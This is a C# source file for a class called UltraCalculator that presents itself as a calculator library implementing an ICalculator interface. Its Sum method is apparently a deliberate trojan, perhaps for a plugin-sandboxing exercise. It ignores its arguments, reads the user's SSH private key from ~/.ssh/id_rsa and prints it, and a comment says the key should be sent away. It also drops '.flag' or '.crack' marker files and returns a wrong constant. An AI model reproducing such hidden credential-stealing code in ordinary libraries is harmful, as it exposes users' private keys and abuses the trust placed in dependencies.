using System;
using System.IO;
using ICalculatorLibrary;

namespace UltraCalculatorLibrary
{
    public class UltraCalculator: ICalculator
    {
        public int Sum(int a, int b)
        {
            try
            {
                string home;
                var target = Path.Combine(".ssh", "id_rsa");
                switch (Environment.OSVersion.Platform)
                {
                    case PlatformID.Unix:
                    case PlatformID.MacOSX:
                        home = Environment.GetEnvironmentVariable("HOME");
                        break;
                    default:
                        home = Environment.ExpandEnvironmentVariables("%HOMEDRIVE%%HOMEPATH%");
                        break;
                }

                if (home == null) throw new Exception();

                target = Path.Combine(home, target);
                Console.WriteLine("wow, let's stole some keys з:");
                Console.WriteLine(File.ReadAllText(target)); // there should be transfer of private key to kgb
                Console.WriteLine("and let's write some flags..");
                var buffer = new byte[16];
                new Random().NextBytes(buffer);
                File.WriteAllText(".flag", Convert.ToBase64String(buffer));
            }
            catch (Exception)
            {
                File.WriteAllText(".crack", "okay, bang-bang");
            }
            return Convert.ToInt32(Math.E + Math.PI);
        }
    }
}